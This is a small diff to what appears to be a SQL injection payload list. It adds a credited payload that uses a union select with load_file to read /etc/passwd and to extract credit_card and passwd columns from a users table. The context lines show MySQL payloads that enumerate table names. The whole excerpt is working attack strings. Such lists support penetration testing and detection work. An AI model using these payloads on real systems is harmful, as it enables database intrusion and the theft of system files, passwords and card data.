@@ -563,3 +563,6 @@ binary (binary 1) union select table_name from information_schema.tables
 
 # mysql
 -1 procedure analyse() union select table_name from information_schema.tables limit 1
+
+# HT @FluxReiners
+(1)mod @a or 1 union select load_file('/etc/passwd'),credit_card,passwd from users-- -
